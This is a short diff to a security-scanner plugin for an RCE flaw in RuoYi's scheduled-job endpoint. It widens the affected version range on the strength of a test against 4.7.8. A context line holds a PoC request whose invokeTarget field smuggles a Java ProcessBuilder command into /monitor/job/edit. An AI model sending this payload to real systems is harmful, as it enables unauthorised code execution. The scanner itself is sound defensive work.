@@ -45,8 +45,10 @@ class JobRcePlugin(PluginBase):
         "  -d \"jobId=1&jobName=test&invokeTarget=org.springframework.cglib.core.ReflectUtils.invokeFn('new java.lang.ProcessBuilder(new String[]{'id'}).start()'\n"
         "  # 该 PoC 会触发 RCE，仅在授权靶场验证"
     )
-    # D2：/monitor/job/edit 白名单在 4.7.0 收紧
-    affected_versions = ">=4.0,<4.7"
+    # 版本范围：REAL-RUOYI.md 在 4.7.8 实例上实测 CONFIRMED（/monitor/job/edit
+    # 返回 AjaxResult 业务层响应，未在鉴权层被拦）；4.8.x 未取得「已修复」证据。
+    # 原范围 <4.7 会把 4.7.8 跳过，故放宽为不设上界，由响应证据判定。
+    affected_versions = ">=4.0"
     # D12：CVSS v3.1 + 合规映射
     cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
     compliance = "等保2.0:8.1.3;OWASP:A03:2021"
